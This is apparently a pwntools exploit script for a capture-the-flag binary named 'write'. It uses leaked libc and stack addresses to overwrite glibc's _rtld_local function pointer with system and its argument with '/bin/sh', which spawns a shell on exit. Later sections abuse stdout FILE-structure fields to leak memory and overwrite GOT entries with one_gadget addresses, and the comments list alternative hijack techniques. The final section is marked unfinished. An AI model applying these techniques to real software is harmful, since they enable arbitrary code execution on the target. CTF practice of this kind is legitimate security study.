#!/usr/bin/env python3

from pwn import *
import re
from IPython import embed

context.terminal = ["terminator", "-e"]

r = process("/home/esc/ctf/bbctf/write/dist/write")
# r = process(["./ld-2.27.so", "./write"], env={"LD_PRELOAD": "./libc-2.27.so"})
# r = remote("0.0.0.0", 9998)
# libc = ELF("/usr/lib/libc.so.6")
libc = ELF(
    "/home/esc/build/glibc-2.31/repos/core-x86_64/pkg/glibc/usr/lib/libc-2.31.so"
)

dump = r.clean(1).decode("latin-1")
print(dump)

libc_puts_addr = int(re.search("puts: 0x(.{12})", dump).groups()[0], 16)
libc_start = libc_puts_addr - libc.symbols["puts"]
print(f"libc_start: {hex(libc_start)}")
stack_addr = int(re.search("stack: 0x(.{12})", dump).groups()[0], 16)
print(f"stack_addr: {hex(stack_addr)}")

# General idea
# find any function ptr in libc thats ever used and write system to it
# find any function ptr in libc thats loaded into rdi and write '/bin/sh\0'
# call (void*) memset(<.data section of libc>, 0x41, 0x1000)

# Solution 3 (alternative)
# _dl_fini (part of exit routine) calls function ptr at <_rtld_local+3848>
# rdi is set to <_rtld_local+2312> when ptr is called
# can write system("/bin/sh\0") to these 2 locations

# offset from libc_puts to _rtld_local
# 4 bits ASLR here so need some luck
RTLD_LOCAL_OFF = 0x1C4EA0
bin_sh = "/bin/sh\0"
r.sendline("w")
r.sendline(f"{libc_puts_addr + RTLD_LOCAL_OFF + 3848}")
r.sendline(f"{libc_start + libc.symbols['system']}")

r.sendline("w")
r.sendline(f"{libc_puts_addr + RTLD_LOCAL_OFF + 2312}")
r.sendline(f"{u64(bin_sh)}")

r.sendline("q")

r.interactive()


# solution 1 (only works if libc is partial RELRO)
# libc is partial RELRO
# Partial RELRO only loads necessary indexes at startup as RO,
# looks up unnecessary indexes when needed into RW page
# we can get offset into libc GOT
# overwrite entire GOT with 0x414141...
# find used GOT entry, overwrite it with one_gadget

# solution 2
# scanf has no limit on memory stored when reading from stdin
# calls malloc if the size of the input is too large
# write ROP chain to lower area in stack
# overwrite malloc_hook with first ROP gadget (move rsp + 0x100; ret;)

# solution 2.5
# Instead of a ROP chain, trace source of rsi, rdx, r12 and r13 values
# if values from the stack overwrites the stack values with 0 (NULL)
# one_gadget now works

# solution 3
# exit call triggers __rtld_lock_lock_recursive
# __rtld_lock_lock_recursive uses value in dl_load_lock as first param
# overwrite __rtld_lock_lock_recursive with system and dl_load_lock with /bin/sh


# solution 5 (requires partial RELRO instead of full)
# can abuse stdout file pointer to dereference and leak any memory
# overwrite _flag with 0xfdab1828 to prevent writing
# change _io_write_base and _io_write_ptr with memory to leak (stack ptr to main)
# overwrite _flag with 0xfdab1820 to trigger writing again, leaking main address
# get offset to GOT from main address, overwrite used entry to one_gadget


libc_base = libc_puts_addr - 0x00000000000809C0
# libc_base = libc_puts_addr -
print(hex(libc_base))
one_gadget = libc_base + 0x10A38C
print(hex(one_gadget))
got_to_write = libc_base + 4108456
print(hex(got_to_write))

gdb.attach(r)

input()
# .data section for libc is PIE so has ASLR but only 4 bits are random
# brute-force it
stdout_addr = libc_puts_addr + 0x1493A0

WRITE_BASE_OFF = 0x20
WRITE_PTR_OFF = 0x28

START_ADDR_OFF = -0x38

base_flag = 0xFDAB1820

NO_WRITE = base_flag | 0x8  # 0x8 is no writing allowed
ALLOW_WRITE = base_flag & ~0x8  # 0x8 is no writing allowed

# change _flag value to no write to preserve stdout state while we write to it
r.sendline("w")
r.sendline(f"{stdout_addr}")
r.sendline(f"{NO_WRITE}")
print(r.clean(1))

# set write_base to start address we want to read from
r.sendline("w")
r.sendline(f"{stdout_addr + WRITE_BASE_OFF}")
r.sendline(f"{stack_addr + START_ADDR_OFF}")
print(r.clean(1))

# set write_ptr to end address we want to read to
r.sendline("w")
r.sendline(f"{stdout_addr + WRITE_PTR_OFF}")
r.sendline(f"{stack_addr + START_ADDR_OFF + 8}")
print(r.clean(1))

# change _flag to allow writing, which will cause stdout to print start address
r.sendline("w")
r.sendline(f"{stdout_addr}")
r.sendline(f"{ALLOW_WRITE}")

dump = r.clean(1).decode("latin-1")

print(dump)

start_addr = u64(re.search("(.*?)=", dump).groups()[0])

PRINTF_GOT_OFF = 0x200880

printf_got_addr = start_addr + PRINTF_GOT_OFF

print(hex(printf_got_addr))
one_gadget = libc_start + 0xCD52A

print(hex(one_gadget))

# need to disable RELRO for this solution to work
# call (void*) mprotect(addr, length, 6)


# TODO none of the one_gadget addresses work, need a ROP chain

# can use libc addresses for ROP chain
# write ROP chain to lower address in stack
# then use "add rsp, 0x1000; ret;" gadget in place of printf address in got

r.sendline("w")
r.sendline(f"{printf_got_addr}")
r.sendline(f"{one_gadget}")


# References:
# https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
# https://github.com/Naetw/CTF-pwn-tips


# libio/bits/libio.h
# -----------------------------------------------------------------------------
# define _IO_MAGIC 0xFBAD0000 /* Magic number */
# define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
# define _IO_MAGIC_MASK 0xFFFF0000
# define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
# define _IO_UNBUFFERED 2
# define _IO_NO_READS 4 /* Reading not allowed */
# define _IO_NO_WRITES 8 /* Writing not allowd */
# define _IO_EOF_SEEN 0x10
# define _IO_ERR_SEEN 0x20
# define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
# define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
# define _IO_IN_BACKUP 0x100
# define _IO_LINE_BUF 0x200
# define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
# define _IO_CURRENTLY_PUTTING 0x800
# define _IO_IS_APPENDING 0x1000
# define _IO_IS_FILEBUF 0x2000
# define _IO_BAD_SEEN 0x4000
# define _IO_USER_LOCK 0x8000
# ...
# struct _IO_FILE {
#   int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
# #define _IO_file_flags _flags

#   /* The following pointers correspond to the C++ streambuf protocol. */
#   /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
#   char* _IO_read_ptr;	/* Current read pointer */
#   char* _IO_read_end;	/* End of get area. */
#   char* _IO_read_base;	/* Start of putback+get area. */
#   char* _IO_write_base;	/* Start of put area. */
#   char* _IO_write_ptr;	/* Current put pointer. */
#   char* _IO_write_end;	/* End of put area. */
#   char* _IO_buf_base;	/* Start of reserve area. */
#   char* _IO_buf_end;	/* End of reserve area. */
#   /* The following fields are used to support backing up and undo. */
#   char *_IO_save_base; /* Pointer to start of non-current get area. */
#   char *_IO_backup_base;  /* Pointer to first valid character of backup area */
#   char *_IO_save_end; /* Pointer to end of non-current get area. */

#   struct _IO_marker *_markers;

#   struct _IO_FILE *_chain;

#   int _fileno;
# ...
